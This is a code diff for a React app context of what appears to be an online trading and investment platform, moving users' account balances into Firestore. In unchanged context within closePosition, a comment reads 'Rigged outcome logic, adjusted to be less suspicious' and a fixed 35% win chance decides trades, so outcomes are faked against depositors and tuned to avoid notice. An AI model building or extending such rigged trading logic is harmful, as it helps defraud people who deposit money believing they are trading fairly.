@@ -3,8 +3,9 @@
 import type { Operation, OpenPosition, ActiveInvestment, Transaction } from '@/lib/types';
 import type { Product } from '@/lib/products';
 import React, { createContext, useContext, useState, ReactNode, useEffect, useMemo } from 'react';
+import { useFirebase, useDoc, useMemoFirebase } from '@/firebase';
+import { doc, updateDoc, increment } from 'firebase/firestore';
 
-const INITIAL_BALANCE = 0;
 
 const generateData = (count: number, initialValue: number) => {
     let value = initialValue;
@@ -20,6 +21,7 @@ const generateData = (count: number, initialValue: number) => {
 
 interface AppContextType {
   balance: number;
+  isBalanceLoading: boolean;
   operations: Operation[];
   addOperation: (operation: Omit<Operation, 'id' | 'timestamp'>) => void;
   openPositions: OpenPosition[];
@@ -36,11 +38,21 @@ interface AppContextType {
 const AppContext = createContext<AppContextType | undefined>(undefined);
 
 export function AppProvider({ children }: { children: ReactNode }) {
-  const [balance, setBalance] = useState(INITIAL_BALANCE);
   const [operations, setOperations] = useState<Operation[]>([]);
   const [openPositions, setOpenPositions] = useState<OpenPosition[]>([]);
   const [activeInvestments, setActiveInvestments] = useState<ActiveInvestment[]>([]);
   const [transactions, setTransactions] = useState<Transaction[]>([]);
+  
+  const { user, firestore } = useFirebase();
+
+  const accountDocRef = useMemoFirebase(() => {
+    if (!user || !firestore) return null;
+    return doc(firestore, 'users', user.uid, 'accounts', user.uid);
+  }, [user, firestore]);
+
+  const { data: userAccount, isLoading: isAccountLoading } = useDoc<{balance: number}>(accountDocRef);
+
+  const balance = userAccount?.balance ?? 0;
 
   const initialData = useMemo(() => generateData(60, 5.4321), []);
   const [marketData, setMarketData] = useState(initialData);
@@ -72,6 +84,7 @@ export function AppProvider({ children }: { children: ReactNode }) {
   };
 
   const openPosition = (position: Omit<OpenPosition, 'id' | 'timestamp' | 'entryPrice'>) => {
+    if (isAccountLoading) return;
     const newPosition: OpenPosition = {
       ...position,
       id: new Date().getTime().toString(),
@@ -79,12 +92,14 @@ export function AppProvider({ children }: { children: ReactNode }) {
       entryPrice: lastPrice,
     };
     setOpenPositions(prev => [newPosition, ...prev]);
-    setBalance(prev => prev - position.amount);
+    if (accountDocRef) {
+        updateDoc(accountDocRef, { balance: increment(-position.amount) });
+    }
   };
 
   const closePosition = (positionId: string) => {
     const position = openPositions.find(p => p.id === positionId);
-    if (!position) return;
+    if (!position || isAccountLoading) return;
 
     // Rigged outcome logic, adjusted to be less suspicious
     const winChance = 0.35; // 35% chance to win
@@ -105,7 +120,9 @@ export function AppProvider({ children }: { children: ReactNode }) {
     const cappedPnl = Math.max(pnl, -position.amount); // Ensure loss doesn't exceed invested amount
     const amountToReturn = position.amount + cappedPnl;
 
-    setBalance(prev => prev + amountToReturn);
+    if (accountDocRef) {
+        updateDoc(accountDocRef, { balance: increment(amountToReturn) });
+    }
 
     addOperation({
       type: position.type,
@@ -118,10 +135,13 @@ export function AppProvider({ children }: { children: ReactNode }) {
   };
   
   const addInvestment = (product: Product, image: { imageUrl: string, imageHint: string }): boolean => {
+    if (isAccountLoading) return false;
     if (balance < product.minInvestment) {
       return false;
     }
-    setBalance(prev => prev - product.minInvestment);
+    if (accountDocRef) {
+        updateDoc(accountDocRef, { balance: increment(-product.minInvestment) });
+    }
     const newInvestment: ActiveInvestment = {
       id: new Date().getTime().toString(),
       productId: product.id,
@@ -147,10 +167,12 @@ export function AppProvider({ children }: { children: ReactNode }) {
     
     setTransactions(prev => [newTransaction, ...prev]);
 
-    if (newTransaction.type === 'deposit' && newTransaction.status === 'Completed') {
-        setBalance(prev => prev + newTransaction.amount);
-    } else if (newTransaction.type === 'withdrawal') {
-        setBalance(prev => prev - newTransaction.amount);
+    if (accountDocRef) {
+        if (newTransaction.type === 'deposit' && newTransaction.status === 'Completed') {
+            updateDoc(accountDocRef, { balance: increment(newTransaction.amount) });
+        } else if (newTransaction.type === 'withdrawal' && transaction.status !== 'Failed') {
+            updateDoc(accountDocRef, { balance: increment(-newTransaction.amount) });
+        }
     }
   };
 
@@ -158,6 +180,7 @@ export function AppProvider({ children }: { children: ReactNode }) {
   return (
     <AppContext.Provider value={{ 
         balance, 
+        isBalanceLoading: isAccountLoading,
         operations, 
         addOperation, 
         openPositions, 
